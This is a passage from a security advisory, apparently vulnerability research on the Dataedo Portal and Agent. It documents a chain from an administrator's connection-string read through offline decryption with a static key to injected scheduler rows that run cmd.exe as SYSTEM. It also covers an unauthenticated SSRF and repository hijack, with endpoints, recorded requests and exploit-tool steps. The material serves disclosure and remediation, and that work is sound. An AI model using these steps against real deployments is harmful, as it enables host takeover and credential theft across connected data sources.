For production deployments the Agent is installed as a Windows service through `AddWindowsService` with an empty `ServiceConfiguration`. The identity is therefore whatever the service is configured with; SYSTEM is what the default service configuration yields in the tested shape and is not a claim about every deployment. The installer's own service-registration table was not inspected to finality, so the production service account is an inference from the host configuration call rather than an artifact-confirmed value, and it is listed as unestablished in section 9.

### Sink Identification — sibling sinks, and whether they are proven

Every other candidate sink found during the audit is listed with its disposition, because the rejections are as informative as the hit.

**Custom connector XML (rejected).** A connector document must carry an XML signature verified against two vendor RSA public keys from a hardcoded `PublicKeyStore`; unsigned or tampered documents raise `CustomConnectorNotVerifiedException` ("could not be verified - its signature is invalid or missing. Import was blocked."). It is then validated against `CustomConnectorSchema.xsd`, and its queries are scanned by a case-insensitive word-boundary regex against 31 prohibited keywords including `update`, `delete`, `drop`, `exec`, `insert`, `execute`, `create`, `alter`, `truncate`, `declare`, `shutdown`, `grant`, `revoke` and `kill`. No `DtdProcessing`, no XML resolver, no `XslCompiledTransform`, so neither XXE nor XSLT execution applies. Its queries also run against an external data source rather than against the product.

**Scheduler job types (rejected as sinks in the Portal).** `TaskParametersConverter` switches on a `JobType` enumeration and deserializes into typed parameter objects — `ImportTaskParameters`, `DataQualityTaskParameters` (severity plus integer rule-instance identifiers), `ExportParameters` (integer export-file identifier and integer database identifiers), `ClassificationTaskParameters`, `RefreshDataProfilingTaskParameters`. No `TypeNameHandling`, no polymorphic resolution from user input, and the visible task runners call processor interfaces rather than any execution primitive.

**SQL against external data sources (rejected).** `POST /api/connections/test-connection/{connectionId:int}` and `fetch-databases/{connectionId:int}` take integer route parameters; the connection string is loaded server-side by identifier from the repository and decrypted there; the query issued is a fixed metadata-discovery statement. There is no injection point, and even a compromised external source cannot reach back into product code execution.

**SQL against the repository itself (rejected).** Raw SQL goes through `FromSqlRaw`/`SqlQueryRaw` with parameter arrays (for example the keyword-driven queries at `Dataedo.Repository.Services.SqlServer:13993` and `:14019`), and `new SqlCommand("SELECT SUSER_ID (@username)", sqlConnection)` at `Dataedo.Repository.Services.SqlServer:10744` is parameterized. The single identifier concatenation, `create login[EscapeSql(username, ']')]` at `Dataedo.Repository.Services.SqlServer:1066`, doubles `]` and `'`, is admin-gated, and uses a hardcoded account name. `SqlInterpreter` at `Dataedo.Application:16023` is a parser whose output stream is `StreamWriter.Null`; it does not execute.

**File writes (rejected).** The only `File.WriteAllText` in the product is `AppSettingsService.ChangeConfigConnectionString` at `Dataedo.Repository.cs:372`, whose path is `Path.Combine(appSettingsPath ?? Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "appsettings.json")`, and whose callers at `Dataedo.Application.cs:13010`, `:13087`, `:13227` and `Dataedo.Repository.cs:768` all pass null or an internal configuration path. The path is not user-controlled, the target is not a web root and not an executable location, and the content is a connection-string value. Exports use integer identifiers and stream an in-memory workbook.

**LLM integration (rejected).** The two platform clients are HTTP wrappers over `{endpoint}/openai/deployments/{model}/chat/completations` and `https://api.openai.com/v1/chat/completions`, with model names constrained by an enumeration. Response text is stored as metadata; it is never evaluated, templated or loaded.

**Unauthenticated SSRF (real, not RCE, published in the adjacent group).** `GetTextEditorLinkMetadataQueryHandler` at `Dataedo.Application:9154` performs `Uri.TryCreate(request.Url, UriKind.Absolute, ...)` followed by `HttpClient.GetAsync(uri, HttpCompletionOption.ResponseHeadersRead, ...)` and parses the body with HtmlAgilityPack. `TextEditorController` has no class-level `[Authorize]` and no `PermissionAuthorizer<GetTextEditorLinkMetadataQuery>` is registered, so `PermissionBehavior` passes it through. The validator requires an absolute URL and permits only http and https: `file:`, `gopher:`, `dict:` and `ftp:` all return HTTP 400 `INVALID_URL`. It reached an internal container service, an external host, and the Portal's own Kestrel port directly — bypassing the reverse proxy, which does not forward `/swagger`, so the internal OpenAPI UI is reachable through this route alone — as well as the cloud instance metadata endpoint, which returned HTTP 200. Metadata JSON is parsed as HTML and emerges as a null title, so credential material is not disclosed through this channel even when a role is attached. It is GET-only, which forecloses writes to internal services. No IP-based trust exists anywhere: a source-wide search for `IsLocal`, `LocalIpAddress`, `RequireHost`, `InternalApi` and `AllowAnonymousToInternal` is empty, and `UseForwardedHeaders` is consumed only for `X-Forwarded-Proto` scheme detection. URI-confusion routing variants (`//`, `/./`, percent-encoded first characters, case changes) all return 404 under Kestrel.

**Unauthenticated outbound SQL (real, not RCE, published in the adjacent group).** The `available-databases` handler at `Dataedo.Application:12822` builds a connection string from attacker-supplied server name, port, login and password and opens it through `RepositoryDbContext`, then runs `SqlQueryRaw<string>(GetRepositoryList())`. Confirmed dynamically: a listening socket on the attacker side received a genuine TDS pre-login packet of 94 bytes with type `0x12`. The query is fixed and not attacker-controlled, and the managed TDS client version in use (Microsoft.Data.SqlClient 6.1.2) has no exploitable client-side code-execution defect for this pattern, so the impact is internal port discovery and, on a Windows deployment, the possibility of NetNTLMv2 challenge capture — which was not demonstrated end to end.

**Two revival bridges proposed by an independent reviewer, both broken by experiment.** A JSON key-injection defect exists in the escaping order used by `ChangeConfigConnectionString`, and calling it directly with a quote-bearing string can inject keys; over HTTP the value passes through `SqlConnectionStringBuilder` normalization, which strips the quotes, and `appsettings.json` remained valid in every window-state experiment, so the anonymous path never triggered it. It is theoretical and is not claimed. The second bridge — driving the Agent through `scheduler-requests` test-connection — ends at a 403 from the connections-management authorizer, confirmed twice.

## 6. Source Identification

### Source Identification — the tainted input and its transport

Two taint sources feed the sink, and they are worth separating because they travel over different transports.

The first source is the HTTP response of `GET /api/repository/connection-string`. Its transport is a cookie-authenticated HTTPS response body. Its content is the SimpleAES digit run. This source crosses the process boundary with the credential inside it, which is the whole defect: the product's own design assumes an encrypted-at-rest secret, and then hands the ciphertext to a client that, by virtue of owning the product, also owns the key. The `GetEncrypted` call at `Dataedo.Application:12793` is on the response path, not on a storage path.

The second source is the row content of `[Scheduler].Job.InvocationData`, `[Scheduler].Job.Arguments` and `[Scheduler].JobQueue.Queue`. Its transport is the TDS protocol between the Agent and the repository database, and it is under the exclusive control of whoever can write those tables. There is no cryptographic protection, no schema constraint limiting the `Type` value, and no producer identity recorded that the consumer checks.

### Source Identification — sanitization that exists, and what it is for

Sanitization does exist in this product, which is why the audit is worth reporting in detail rather than as a blanket condemnation.

`SqlConnectionStringBuilder` normalization is applied to connection parameters before they are written into `appsettings.json`, and it is effective: quote characters in a supplied password are stripped, the resulting file stayed valid JSON in repeated window-state experiments, and the theoretical JSON key-injection path could not be triggered over HTTP.

`EscapeSql` doubles both `'` and `]` for the one identifier-concatenation site in login management.

Parameterization is used essentially everywhere else on the repository, through EF Core and Dapper parameter arrays.

Custom connector documents are signature-verified, XSD-validated and keyword-filtered before their queries are accepted.

The rate limiter applies a login policy and an access-code policy.

What none of these do is touch the scheduler storage path, because from the Portal's point of view that path is not user input at all — it is internal job bookkeeping produced by the Portal itself as a Hangfire client. The Agent inherits that assumption. That inheritance is the root cause.

### Source Identification — validation that is absent

Enumerating the absent checks makes the fix list concrete.

- No allowlist of invocation types, at either the client or the server side of the scheduler.
- No rejection of types outside the vendor's own `Dataedo.Scheduler.Jobs` namespace, no rejection of `System.*` types, and no specific rejection of `System.Diagnostics.Process`.
- No declaring-type check at execution time. The two `IClientFilter` instances do check for `ISchedulerTaskExecutor`, but only on the creation path and only in the client role.
- No integrity protection over `[Scheduler].Job` rows — no signature, no HMAC, no producer identity column that the consumer verifies.
- No least-privilege separation between the credential used to *read* the catalog and the credential used to *write* scheduler rows. The connection string handed to the client is a single principal with full control of the database, which is why one disclosure yields both.
- No masking of the credential portion of the connection string in the response. The handler encrypts and returns the entire string, password included.
- No per-installation key material for that encryption, and no key rotation path in use despite `GenerateEncryptionKey()` existing.
- No detection of an anomalously-typed job row: the recorded run transitioned to `Succeeded` and recorded a state result of "Can not serialize the return value", which is what happens when the invoked method returns a live object rather than a scheduler result. That string is, in practice, a reliable detection fingerprint of a non-vendor invocation, and nothing in the product alerts on it.


## 7. Data Flow

### Data Flow — end-to-end chain

```
  [attacker: repository-management principal]
        |
        |  (1) POST /api/auth/login {login, password, loginMethod}      -> 200 + Set-Cookie Dataedo.Cookie
        v
  Dataedo Portal (ASP.NET Core, net9.0)
        |
        |  (2) GET /api/repository/connection-string
        |      GetConnectionStringQueryAuthorizer: Require().Role(RoleAction = 11)
        |      GetConnectionStringQueryHandler (Dataedo.Application:12789)
        |        -> SimpleAES.GetEncrypted(defaultConnection.Value.ConnectionString)
        |                                              (Dataedo.Application:12793)
        |      -> 200, body = 528 decimal digits = 176 bytes = 11 AES blocks
        v
  [attacker: offline]
        |
        |  (3) SimpleAES decrypt, key[32] + IV[16] from Dataedo.Settings.dll
        |      RijndaelManaged AES-256-CBC, PKCS7, 3-digit-decimal decoding
        |      -> Data Source=<repository-db-host>;Initial Catalog=<repository-db>;
        |         User ID=sa;Password=<PASSWORD>;Authentication=SqlPassword
        v
  Repository database (SQL Server)  <-- single trust anchor for the whole product
        |
        |  (4) INSERT [Scheduler].Job  (StateName 'Enqueued', InvocationData,
        |                               Arguments, CreatedAt)
        |      INSERT [Scheduler].JobQueue (JobId, Queue 'default', FetchedAt NULL)
        |      QUOTED_IDENTIFIER ON required: the schema uses filtered indexes
        v
  Dataedo Agent (win-x64 Windows service, Hangfire server x2: default + priority)
        |
        |  (5) fetch -> deserialize InvocationData -> resolve Type with the
        |      default type resolver (no allowlist, GlobalJobFilters cleared,
        |      no execution-time filter inspects the invocation)
        |      -> Process.Start("cmd.exe", "/c <payload>")
        v
  [Agent host]  marker file written; identity = Agent process identity
                observed: nt authority\system  (SYSTEM-scheduled shape)
                          <agent-host>\administrator  (console shape)
```

Each numbered edge was observed. Edge (2) produced the recorded 528-digit response. Edge (3) produced a connection string that reconnected successfully to the same repository database, and the reverse direction was also proven: a ciphertext constructed offline with the same key and IV was written into the Agent's configuration and the real Agent binary accepted it and connected, which confirms the key, the IV and the encoding independently of the decryption direction. Edge (4) was executed with a TDS client using the `-I` switch. Edge (5) was observed through the job state progression and through the marker file.

### Data Flow — properties of the chain worth naming

**No gadget chain.** The invoked method is a first-class operating-system execution API taking two strings. There is no serialization gadget hunting, no `ObjectDataProvider`, no `TypeConfuseDelegate`. The invocation document names the sink directly. This lowers the bar for exploitation from "find a gadget in the Agent's dependency set" to "write two rows".

**Bidirectional cryptographic proof.** The static key was validated in both directions — decrypting a production-shaped ciphertext, and encrypting a ciphertext that the real Agent subsequently accepted. A one-directional demonstration would have left the encoding or padding mode in doubt.

**The credential is not scoped.** The recovered login is a sysadmin-level principal on the database that also stores `credentials`, `ssh_configurations`, `users`, `licenses`, `permissions`, `sso_configurations`, `login_access_codes` and `configuration`. Recovering it does not merely enable the scheduler write; it enables offline recovery of every downstream data-source secret in the catalog, each of which is itself protected only by the same static key. The blast radius therefore extends past the Agent host to every data source the catalog is connected to.

**Durability and repeatability.** The injected row persists in the repository until removed, so an interrupted attempt can be inspected and re-driven, and the same write primitive is reusable for persistence — a new row is all that is required. Cleanup is equally trivial, which is why the published tooling ships an idempotent delete statement keyed on the marker token.

**Three trust boundaries crossed.** Portal role → repository database, then repository database → Agent process, then Agent process → Agent host operating system. Each crossing is a place where a control should have existed: at the first, credential masking; at the second, an invocation-type allowlist; at the third, a least-privilege service account and a constrained job executor. None exists.

**Asymmetry between the two directions of the same table.** The Portal writes `[Scheduler].Job` rows only through the Hangfire client, and its `IClientFilter` instances enforce that the declaring type implements `ISchedulerTaskExecutor`. The Agent reads them with no equivalent constraint. The producer is disciplined; the consumer is not, and the consumer is the one that executes.

**The disclosure is one HTTP request.** There is no multi-step protocol abuse, no timing attack, no oracle. One authorized GET, one offline decryption.

## 8. Exploit Construction

### Exploit Construction — step sequence

The published tool implements the chain with the Python standard library only, including a local AES-256-CBC implementation with the S-box derived at runtime and the round functions written directly, so that no cryptographic dependency is required. Its AES core is validated against published known-answer vectors at every run in `--self-test` mode: AES-128 and AES-256 single-block encryption of `00112233445566778899aabbccddeeff` with the standard ascending key must produce `69c4e0d86a7b0430d8cdb78070b4c55a` and `8ea2b7ca516745bfeafc49904b496089` respectively, and the AES-256 decryption of the latter must return the original plaintext. A SimpleAES round trip through the 3-digit decimal encoding is asserted in the same self-test.

The runtime sequence is:

1. Fingerprint the target with `GET /api/repository/host-environment` and `GET /api/repository`. Both are unauthenticated and reveal the deployment shape and the current repository state including the static `lastOperation` field.
2. Authenticate the repository-management principal via `POST /api/auth/login` with `{login, password, loginMethod, userAgent}`, collecting the session cookie. A pre-existing session cookie can be supplied instead, which is how an operator with a browser session drives the tool without a password. Because the shipped cookie is marked `Secure` and `SameSite=None`, the tool detects a plain-HTTP run and replays the raw `Set-Cookie` header rather than relying on the cookie jar, which correctly refuses to send a Secure cookie over an insecure scheme.
3. Issue `GET /api/repository/connection-string`. The tool distinguishes the responses that matter: HTTP 401 means the principal does not hold the repository-management role (and is reported as the gate that makes this chain post-authentication), HTTP 403 means authenticated but unauthorized for the query, HTTP 200 carries the digit run.
4. Extract the longest digit run from the body (the response may be a bare string or a JSON-encoded string), report the character count, decoded byte count and block count, then decrypt offline with the static key and IV, remove PKCS7 padding, and decode the plaintext — UTF-8 first, then UTF-16-LE, then Latin-1 as a fallback. The plaintext codec is not documented in the product's own surface, and the block arithmetic settles it: 176 bytes of ciphertext bounds the plaintext at 175 bytes or fewer, which matches a single-byte encoding of the recorded string and rules out UTF-16, whose length would require 21 blocks.
5. Parse the connection string into its key-value pairs, split the SQL Server comma-port form in `Data Source`, and print every value with the password replaced by a placeholder.
6. Reachability-probe the repository listener with a plain TCP connect, then emit the injection statement. The database step mirrors the recorded runs: the tool prints the exact T-SQL and, only when the operator supplies a client binary path, executes it through that binary with `-I` so that `QUOTED_IDENTIFIER` is on. No TDS protocol code is implemented locally.
7. Re-read the storage after a configurable wait: a count of `[Scheduler].Job` rows whose `Arguments` contain `cmd.exe`, and a count of `[Scheduler].JobQueue` rows. In a real run these move from zero to one; in control mode they must not.

### Exploit Construction — payload engineering constraints

The payload is a marker-file write, deliberately: `whoami`, `hostname` and an advisory token appended to a single file. Nothing destructive is issued. Three engineering constraints were learned the hard way and are encoded in the tool.

The `Arguments` column and `InvocationData.Arguments` must both carry the command. The recorded negative control exists because of exactly this: when the `Arguments` column was written with a placeholder token while `InvocationData` was correct, the Agent's log showed the shell reporting that the placeholder was not recognized as a command — which simultaneously proved the worker was executing database-supplied arguments and identified the mismatch. The tool therefore derives both fields from one payload value.

The escaping is two layers deep. `InvocationData.Arguments` is itself a JSON array serialized as a string inside the outer JSON object, so a Windows path in the payload appears with doubled backslashes in the outer document and quadrupled backslashes in the inner one. A single T-SQL literal wraps the whole thing, so single quotes are doubled for the SQL parser.

The `Created` timestamp and state name must be coherent: `StateName` is `Enqueued` and `CreatedAt` is `SYSUTCDATETIME()`, and the `JobQueue` row must name a queue the Agent actually polls. The tested Agent polled `default` and `priority`; the tool defaults to `default`.

### Exploit Construction — what the exploit deliberately does not do

- It does not attempt to reach the chain anonymously. It requires credentials or a session cookie for a repository-management principal and says so in its own output.
- It does not write to the repository when no client binary is supplied; it prints the statement so the operator can review it.
- It does not default to a remote host. Every endpoint is a command-line argument with loopback or explicit-placeholder defaults, including the database host.
- It does not use the recovered database endpoint unless `--use-recovered-endpoint` is passed, so an accidental run cannot reach a production database host discovered from the response.
- It does not issue destructive commands, does not create accounts, does not delete catalog data, and does not touch downstream data sources.
- It provides `--emit-cleanup`, an idempotent statement that deletes the rows it wrote by matching the marker token in the `Arguments` column, so a test can be fully retracted.

The control mode repeats every step — authentication, the authorized GET, the offline decryption — and then substitutes a non-executing invocation document (`System.String` / `Concat` with a `control-no-exec` argument), omits the `[Scheduler].JobQueue` row entirely so that no polling worker can fetch it, waits through a poll interval, and re-runs the readback to show that zero executable job rows exist and that no marker file is produced. The contrast with a normal run is the point: the readback query is identical in both modes, so the difference in its result is attributable only to the injected payload.

## 9. Dynamic Verification

### Dynamic Verification — environment

| Role | Component | Shape |
|---|---|---|
| Victim Portal | `Dataedo.Api` 26.2.8, `net9.0`, product binaries extracted from the vendor installer, digest-reconciled against the downloaded installer | `aspnet:9.0` container, Kestrel, Production, private container network, HTTPS on port 8443, not internet-exposed |
| Victim Agent | `Dataedo.Agent` 26.2.8, `win-x64`, real product executable extracted from the vendor Agent installer | Windows Server 2025, resident as a SYSTEM-privileged scheduled task, listener `http://[::]:15999`, `rollForward = Major` |
| Repository database (Portal side) | SQL Server 2022 | sibling container on the same private network |
| Repository database (Agent side) | SQL Express | same host as the Agent, port 1433, populated by BACKUP/RESTORE of the container-side repository (2.6 MB backup file) |
| Attacker-controlled databases | SQL Server 2022 | three separate lab databases across the window-state runs; the Agent run used the host-local instance |
| Static analysis | 23 assemblies decompiled, ~190,000 lines, 50 files | Portal side |
| Static analysis | ~5,600 decompiled C# files overall | including auth, repository, scheduler, agent and settings assemblies, with PDB symbols on the API assembly |

Notation used throughout this document: host literals captured during verification are generalized to `<portal-host>` for the Portal listener, `<agent-host>` for the Agent machine, `<repository-db-host>` for the repository database server and `<attacker-sql-host>` for a database instance under our control; every secret value appears as `<PASSWORD>`. The published tool takes each of these as a command-line argument with loopback or placeholder defaults.

The Portal instance was started from the extracted binaries rather than through the install wizard. Where a claim depends on a factory default that the wizard would have replaced, the deployment shape is identified instead of generalized — this applies specifically to the JWT signing key in the adjacent group.

### Dynamic Verification — the triggering request

The counted chain's HTTP footprint is one authenticated GET. The recorded sequence:

```
POST /api/auth/login
  {"login":"<administrator-role-user>","password":"<PASSWORD>","loginMethod":0,"userAgent":"poc-agent"}
  -> HTTP 200
     Set-Cookie: Dataedo.Cookie=CfDJ8...; path=/; HttpOnly; Secure; SameSite=None

GET /api/repository/connection-string            (cookie presented)
  -> HTTP 200
     body: 528 decimal digits (SimpleAES ciphertext, 176 bytes, 11 blocks)

offline: SimpleAES decrypt with the key and IV recovered from Dataedo.Settings.dll
  -> Data Source=<repository-db-host>;Initial Catalog=<repository-db>;
     Integrated Security=False;User ID=sa;Password=<PASSWORD>;
     Trust Server Certificate=True;Authentication=SqlPassword
```

The principal used was an all-roles session. In our environment that session was produced by the first-user path against a repository database we controlled, which is described in section 10 as part of the adjacent group; on the newer build the same shape was reproduced with a different first user and the connection-string read again returned ciphertext decryptable with byte-identical key material. The production equivalent of that principal is an ordinary administrative user of the catalog — the authorizer enforces role action 11 regardless of how the session was obtained — and the negative control on the other side of the gate was performed against a principal that was *not* an administrator: a second SQL login with zero application permissions received HTTP 400 with `ACCESS_WITHOUT_ANY_PERMISSIONS` at the `HasWebAccess` gate and was issued no session at all.

The storage write that follows used a TDS client with the `-I` switch, and the statement is reproduced in section 2. The Agent had already attached itself to the same repository at that point; its startup log read:

```
Dataedo Agent started successfully. Repository: '<repository-db>' on server '127.0.0.1,1433'
```

and `[Scheduler].Server` showed two registered workers with continuing heartbeats on the `default` and `priority` queues, with a matching `scheduler_agents` row.

### Dynamic Verification — observed output

Two builds of the decryption routine were exercised, and both are cited because the equivalence of the key material across them is what makes the disclosure a product-wide condition rather than a build-specific accident:

```
build 26.2.8  GET /api/repository/connection-string  (administrator-role cookie)
              -> HTTP 200, ciphertext = 528 decimal digits = 176 bytes = 11 AES blocks
              -> offline SimpleAES decryption with the static key and IV
              -> Data Source=<repository-db-host>;Initial Catalog=<repository-db>;
                 User ID=sa;Password=<PASSWORD>;Authentication=SqlPassword

build 26.3.0  same route (administrator-role cookie)
              -> HTTP 200, ciphertext decrypted with byte-identical key material,
                 confirmed present in that build's own Dataedo.Settings.dll by a
                 byte-level search of the shipped assembly
              -> ...Initial Catalog=<repository-db-2630>;User ID=sa;Password=<PASSWORD>
```

The Agent binary was executed against the 26.2.8 build only, so the execution segment on 26.3.0 rests on the Portal-side reproduction plus the absence of change signals in the Agent bundle, and is reported as argued rather than verified.

The injected job was assigned identifier 7. Its state progression was recorded directly from the storage tables:

```
Job Id=7   Enqueued -> Processing (ServerId ...:45612:be9249bf...) -> Succeeded
           PerformanceDuration = 4 ms
           State.Result = "Can not serialize the return value"
```

`PerformanceDuration` of 4 milliseconds and the state result string together prove the method was actually invoked: `Process.Start` returns a live `Process` object, which the scheduler cannot serialize into its state column, so it records that message. A job that had been rejected or never fetched would not have reached `Succeeded` and would not have produced that string.

The marker file `C:\dataedo_pwn.txt` was written. Two first-hand snapshots exist, from two different Agent process shapes, and the file was overwritten between them:

```
snapshot A (console-launched Agent, read live by the controlling session)
  <agent-host>\administrator
  <agent-host>
  DATAEDO-HANGFIRE-RCE
  System   4   Services   0   128 K

snapshot B (SYSTEM-scheduled Agent, observed during independent re-analysis)
  nt authority\system
  <agent-host>
  DATAEDO-HANGFIRE-RCE
  System   4   Services   0   128 K
```

The trailing line is filtered `tasklist` output for PID 4, showing the System process in session 0 under the Services session name — a service-context execution environment, consistent with how the Agent is installed in production.

### Dynamic Verification — the negative control and why it matters

Two controls were run, and they answer different questions.

**Argument-provenance control.** The first injection attempt wrote a placeholder token into the `[Scheduler].Job.Arguments` column while the `InvocationData` document was correct. The Agent's run log recorded the shell complaining that the placeholder was not recognized as an internal or external command. This is the strongest single piece of evidence in the package, because it establishes that the executed arguments came from the database row and not from any configuration, command line or code path inside the Agent. Without it, a reviewer could reasonably ask whether the observed execution was an artifact of the test rig. With it, the causality is direct: the database content changed, and the executed content changed with it.

**Tool-level control mode.** The published script's `--control` flag is the reproducible form of the same test. It performs authentication, the authorized GET, the offline decryption and the storage interaction identically, then writes a job row whose invocation document names `System.String` / `Concat` with a `control-no-exec` argument, writes no `JobQueue` row, and re-runs a readback counting rows whose `Arguments` contain `cmd.exe`. The expected result is zero executable rows and no marker file on the Agent host, against one executable row and a marker file in a normal run. This is what makes the advisory reproducible by a third party who does not want to execute anything: control mode exercises the disclosure and the decryption — the parts that constitute the vulnerability — while proving that the execution outcome is produced by the injected payload and nothing else.

### Dynamic Verification — boundaries of what was verified

**Proven end to end across the Portal-to-Agent hop:** the authorized ciphertext read on two builds; offline decryption with key material recovered from the shipped assembly, in both directions; recovery of a sysadmin-level repository login; the two-row storage write; worker fetch; invocation of the attacker-named type and method; the state progression to `Succeeded`; the marker file; the executing identity in two process shapes; and the argument-provenance negative control.

**Not proven, and not claimed:**

- The Agent binary was not re-executed against the newer Portal build. The Portal-side chain was reproduced there and the Agent bundle showed no structural change, which is an argument, not a verification.
- The production Windows service account was not confirmed from the installer's service-registration table. `AddWindowsService` is called with an empty `ServiceConfiguration`, which by convention yields LocalSystem, and the SYSTEM observation matches that convention — but the convention was not read out of the installer's own service table.
- The four SignalR hubs' negotiate-phase authentication was not exercised.
- The CORS misconfiguration in the adjacent group was established by reversing the shipped configuration code; no browser-driven cross-site demonstration was performed.
- NetNTLMv2 capture through the outbound SQL surface was not demonstrated; only the outbound connection and the TDS pre-login packet were.
- SAML identity-provider injection through a hijacked repository was not dynamically expanded; the configuration tables are attacker-writable in that state, which is static evidence only.
- Whether a given production deployment exposes its repository database to an attacker-reachable network segment is deployment-specific. In our container lab the database listener was loopback-bound, so the storage write during the Portal-phase tests was performed from the container host rather than across a hostile network; the Agent-phase test used the host-local SQL Express instance, which is the realistic shape for that hop.
- The JSON key-injection defect in the configuration writer's escaping order was never triggered over HTTP and is reported as theoretical only.


## 10. Reachability and Security Impact

### Reachability and impact — network position

Two network positions are required, and they are different ones.

For the disclosure step, the attacker needs to reach the Portal's HTTP(S) listener and hold a session for a principal with role action 11 or above. In a typical enterprise deployment the Portal is reachable from the corporate network and frequently from the internet behind a reverse proxy; the credential requirement is the binding constraint, not the network path.

For the execution step, the attacker needs to reach the repository database's TDS listener — port 1433 by default for SQL Server, 5432 for PostgreSQL — with the recovered login. Nothing in the product publishes or proxies that listener; it is an infrastructure port whose exposure is decided by the deployment. Where an attacker already holds the recovered `sa` credential and can be placed in the same network segment as the Portal and Agent hosts, both positions collapse into one and the whole chain runs from a single vantage point.

Note the direction of the second requirement: it is the *attacker* who must reach the database, not the reverse. The Agent initiates its own connection outbound, and polls. There is no callback or reverse-connection requirement, no inbound port on the attacker's side, and no need to interact with the Agent's own HTTP listener.

### Reachability and impact — what the achieved identity controls

In the verified shape the achieved identity is `nt authority\system` on the Agent host. Practically that means:

- Full control of the Agent host: filesystem, registry, service control manager, local accounts, memory of every process on that machine.
- The Agent host's credential store. The Agent holds the repository connection string and, through the repository, the `credentials` and `ssh_configurations` families covering every downstream data source the catalog is connected to — SQL Server, PostgreSQL, Oracle, Athena, QuickSight and the rest. All of that ciphertext is protected by the same static key, so an offline pass over the repository yields plaintext credentials for the estate's data platform. SSH tunnel endpoints and passwords are in the same set.
- Network position. The Agent is by design allowed to reach every catalogued data source, which in a governed estate means the analytical databases, the warehouse, and frequently the production sources behind them. From a SYSTEM-level Agent host with those credentials, lateral movement into the data platform requires no further vulnerability.
- Persistence, in two independent forms: the Windows service itself, and additional scheduler rows in the repository, which survive Agent restarts and require only another database write to re-trigger.
- Availability of the catalog's operational layer. Scheduler rows drive imports, data-quality runs, exports, classification and profiling refresh. Consuming, deleting or corrupting them stops catalog synchronization; the same write access that enables execution also enables that denial.
- Integrity of the catalog itself, through the recovered repository login. Every governance artifact — lineage, glossary terms, ownership, quality results — is attacker-writable at `sa` level, which matters for a product whose business purpose is being the trusted record of the estate's data.

Against the Portal the achieved identity also yields an indirectly complete compromise of confidentiality for the catalog, since the repository database is the Portal's entire state.

### Reachability and impact — the unauthenticated question, answered in full

This subsection exists because an earlier reading of this research answered it the other way, and the correction is more useful than the original claim.

**What was originally asserted:** that an unauthenticated attacker could switch a running Portal's repository to an attacker-controlled database, and that an already-installed Agent would follow the Portal onto the attacker's repository and execute injected jobs — a zero-click, anonymous, remote path to SYSTEM.

**What the reverse engineering actually shows:** the Agent reads its repository connection string from its own configuration file, at `Dataedo.Agent.Startup/ServicesConfigurator.cs:43`. It exposes no controller and no remote-configuration API of any kind. Nothing that happens to the Portal's configuration propagates to an installed Agent. The propagation leg of the claim does not exist.

A second sub-claim was withdrawn at the same time: that a healthy, already-configured instance can be silently switched to another repository. `set` returns HTTP 409 with an explicit "already configured" message, `create-on-existing-database` surfaces `RepositoryAlreadyConfiguredException` through `lastOperation.error`, and the validator's `IsConfigured` gate was confirmed by experiment. The endpoint's HTTP 202 is a fire-and-forget acknowledgement that carries no information about the outcome, so an earlier reading of a 202 as a successful switch was wrong; the subsequent state read showed the configured repository unchanged.

Two independent adversarial reviews reached the same conclusion from different directions, and a third experiment settled the two revival bridges that were proposed: JSON key injection into the configuration file (blocked over HTTP by `SqlConnectionStringBuilder` normalization, never triggered) and driving the Agent through the scheduler-request test-connection endpoint (403 at the connections-management authorizer, twice).

**Therefore the anonymous surface stops at compromise of the Portal and its data, not at code execution.** What an unauthenticated party can genuinely do is set out below as the adjacent disclosure group. What separates those primitives from Agent-host execution is always a deployment-induced condition — an installation-state or database-write precondition, a configuration-file write, and the static key. Those are the conditions named in the preconditions row of section 2 and in the Attack Complexity metric of section 12.

**The three bridges from an anonymous position to execution, stated with their real requirements:**

1. *Window-state hijack followed by a normal Agent installation.* During a deployment window — after the installer has finished but before the repository wizard has run, or a container quickstart launched with an empty catalog, or a repository outage or migration window — the ungated registration routes accept an attacker database. The Portal then migrates the full schema to it (255 tables on 26.2.8; 263 on the newer build) and persists the switch into `appsettings.json`. An administrator who then installs the Agent following the guidance the hijacked Portal displays will point that Agent at the attacker's repository, and any job written there executes. This is a deployment race or supply-line scenario. It requires the victim to install a component during the window, so it is not zero-click.
2. *Write access to the `[Scheduler]` schema of the legitimate repository.* A low-privileged SQL login with write rights on that schema, an SQL injection elsewhere in the estate, or credentials recovered from an installer-produced `Dataedo-Web-backup-*.zip` archive — those archives carry ciphertext that the static key decrypts offline. This bridge does not involve the Portal's HTTP surface at all.
3. *Write access to the Agent's configuration file.* Combined with the static key, an attacker who can write the Agent's `appsettings.json` can forge a valid ciphertext pointing the Agent at any repository. Reverse construction was proven: a ciphertext built offline with the recovered key and IV was accepted by the real Agent, which connected and polled. This requires filesystem write access to the Agent host, which is a much stronger precondition than anything in the HTTP surface.

**The counted chain in this advisory does not use any of those bridges.** It starts from an authenticated repository-management principal and is scored accordingly. The bridges are documented because a vendor fixing this needs to see all three, and because bridge 1 in particular means the anonymous group and the execution outcome can be composed in a real deployment — a composition that is described honestly as an amplifier rather than as an anonymous RCE.

**The adjacent disclosure group — distinct findings, published together, scored separately.** These items are real and reportable. They are not the counted chain, they did not contribute to the 8.1, and they are published inside this advisory rather than as separate advisories because they lack a complete independent artifact set of their own — no separate published tool and no independent end-to-end verification package each.

*Item A — unauthenticated repository-management surface (CWE-306, CWE-284).* 18 ungated routes, a 17-entry middleware allowlist, and no global fallback policy, as characterized in section 4. Demonstrated three times, including a window deliberately re-created by emptying the catalog configuration and restarting the process, and once on the newer build. The recorded sequence:

```
POST /api/repository/create-on-existing-database
  {"serverName":"<attacker-sql-host>","database":"<repository-db>","login":"sa","password":"<PASSWORD>"}
  -> HTTP 202

Portal application log:
  Configured scheduler repository
  Set web catalog connected flag
  Updated app settings with new connection string
  Repository creation completed successfully

attacker database: 255 tables created (full code migrations plus the [Scheduler] schema)
appsettings.json: DefaultConnection.ConnectionString rewritten to a SimpleAES digit run,
  which decrypts offline to the attacker's own server, catalog and credentials
```

Takeover of the Portal then follows without any credential from the victim, because the login validator validates against the repository database. `SqlServerUserValidator.CheckIfValidSqlServerCredentials` opens the configured connection with the submitted credentials and runs `SELECT TOP(1) 1 FROM [version]` — trivially true against an attacker database with a login the attacker created. `LoginCommandHandler` finds no license row and auto-registers the user through `UserLicensesService.CreateUserAsync`; `UserAuthenticationManager.AuthenticateUser` then calls `TryCreateFirstUserInitialPermissionsAsync`, whose `IsFirstWebCatalogUser` test is true because the sessions table of a freshly migrated database is empty, and `AssignAllRolesToUser` grants every role. Recorded:

```
